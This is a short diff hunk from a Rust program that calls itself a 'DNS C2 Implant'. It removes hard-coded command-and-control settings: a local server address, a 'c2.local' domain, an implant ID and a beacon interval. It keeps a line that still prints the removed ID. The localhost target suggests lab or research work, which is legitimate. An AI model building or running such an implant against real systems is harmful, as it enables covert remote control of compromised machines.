@@ -4,11 +4,6 @@ use std::net::UdpSocket;
 use std::thread;
 use std::time::Duration;
 
-const C2_SERVER: &str = "127.0.0.1:5353";
-const DOMAIN: &str = "c2.local";
-const IMPLANT_ID: &str = "implant1";
-const BEACON_INTERVAL: u64 = 5; // seconds
-
 fn main() -> std::io::Result<()> {
     println!("DNS C2 Implant");
     println!("Implant ID: {}", IMPLANT_ID);
